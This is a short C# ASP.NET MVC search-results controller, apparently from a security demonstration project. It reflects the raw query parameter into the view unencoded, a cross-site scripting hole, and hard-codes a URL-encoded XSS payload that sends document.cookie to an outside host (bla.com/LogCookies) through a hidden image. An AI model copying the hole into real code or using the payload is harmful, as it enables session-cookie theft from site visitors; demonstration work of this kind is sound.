using SitecoreSecurity.Web.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace Safecore.Web.Controllers
{
  public class SearchResultsController:Controller
  {    
    public ActionResult Index(string q)
    {
      var b = Request.QueryString["q"];
      string s = @"%27)%3Bvar%20img%3Ddocument.createElement(%22img%22)%3Bimg.src%3D%22http%3A%2F%2Fbla.com%2FLogCookies%3Fcookies%3D%22%2BencodeURIComponent(document.cookie)%3BimgsetAttribute%22style%22%2C%20%22display%3A%20none%22)%3Bdocument.body.appendChild(img)%3B%24(%27h2%27).text(%27No%20results%20found%27)%3B%2F%2F";
      var a = HttpUtility.HtmlDecode(s);
      var list = new List<SearchResultsModel>();

      var m1 = new SearchResultsModel { SearchTitle = b, Description = "bla" };
      list.Add(m1);
      return View(list);
    }
  }
}